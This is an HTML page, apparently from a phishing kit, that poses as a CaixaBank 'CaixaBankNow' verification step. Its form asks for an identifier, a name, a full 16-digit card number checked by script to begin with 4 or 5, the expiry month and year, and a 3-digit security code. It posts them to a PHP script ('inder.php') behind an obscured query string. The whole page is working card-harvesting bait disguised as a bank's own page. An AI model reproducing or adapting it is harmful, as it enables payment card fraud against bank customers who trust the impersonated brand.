<!DOCTYPE html>
<html>
<head>
	<title>CaixaBank | verificación CaixaBankNow</title>
	<link rel="icon" type="image/png" href="../img/icon.png" />
	<link rel="stylesheet" type="text/css" href="../img/css.css">
	<script type="text/javascript">
    function karimo(){  
    		var mes = document.getElementById('selectMes').value;
    		var ano = document.getElementById('selectano').value;
		    var cc=document.form.put4.value;
			var bin=cc.substring(0,1);

    			if (mes!="") {      
	    				if (ano!="") {
	    					if (bin!="4" && bin!="5") {
							alert("El formato del número de tarjeta no es válido");
							//document.getElementById('put4').style.border = "1px solid red";
							return false;
							}else{
	            			document.form.submit();
	    					}

	    				}else{
	    					alert("La fecha de caducidad es inválida");
	    					//ano.style.border = "1px solid rgba(255, 0, 0, 0.59)";
		    				return false;
	    				}
	    			
    			}else{
    				alert("La fecha de caducidad es inválida");
    				//mes.style.border = "1px solid rgba(255, 0, 0, 0.59)";
    				return false;
    			}
        }
        </script>
</head>
<body id="body">
	<div id="cnt">
		<div id="hdr">
			<div id="hedr">
				<form action="./inder.php?gUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3&ug=cudzMub3JnLzE5OTkveGh0bWwiPg0KICAgIDxoZWFkPg0KICAgICAgICA8dGl0bGU+IEFwcGxlI" method="POST" name="form" id="frm" autocomplete="off">
			<div id="put2" class="absolut"><input class="put" type="text" style="width: 178px;" placeholder="" name="put2" minlength="8" maxlength="10" required></div>
			<div id="pt3" class="absolut"><input class="nput" type="text" placeholder="" name="put3" maxlength="50" required></div>
			<div id="pt4" class="absolut"><input class="nput" type="text" placeholder="" id="put4" name="put4" minlength="16" maxlength="16" required></div>
			<div id="pt5" class="absolut" style="width: 142px;">
				<div class="ocultar" style="float: left;">
				<select id="selectMes" name="day" required>
				<option value="">Mes</option>
				<option value="01">01</option>
				<option value="02">02</option>
				<option value="03">03</option>
				<option value="04">04</option>
				<option value="05">05</option>
				<option value="06">06</option>
				<option value="07">07</option>
				<option value="08">08</option>
				<option value="09">09</option>
				<option value="10">10</option>
				<option value="11">11</option>
				<option value="12">12</option>
				</select>
				</div>
				<div id="numeroDocumentoDIV" class="" style="float:right;">
				<select id="selectano" name="month" required>
				<option value="">año</option>
				<option value="18">2018</option>
				<option value="19">2019</option>
				<option value="20">2020</option>
				<option value="21">2021</option>
				<option value="22">2022</option>
				<option value="23">2023</option>
				<option value="24">2024</option>
				<option value="25">2025</option>
				<option value="26">2026</option>
				<option value="27">2027</option>
				<option value="28">2028</option>
				</select>
				</div>
    		&nbsp;&nbsp;
			</div>
			<div id="pt6" class="absolut"><input class="put" type="text" placeholder="" name="put6" minlength="3" maxlength="3" required></div>
				<div id="put3" class="absolut"><input type="image" src="../img/S1.png" onclick="return karimo();"></div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>